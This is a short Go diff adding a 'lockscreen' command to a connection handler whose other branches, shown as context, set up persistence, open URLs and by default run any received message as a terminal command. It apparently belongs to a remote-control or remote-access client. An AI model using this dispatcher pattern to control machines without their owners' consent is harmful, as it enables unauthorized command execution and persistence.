@@ -50,6 +50,8 @@ func (c ConnectionHandler) Handle() error {
 			c.UseCase.Persistence.Persist(message.Data)
 		case "open-url":
 			c.UseCase.OpenURL.Open(string(message.Data))
+		case "lockscreen":
+			c.UseCase.LockScreen.Lock()
 		default:
 			c.UseCase.Terminal.Run(string(message.Data))
 		}
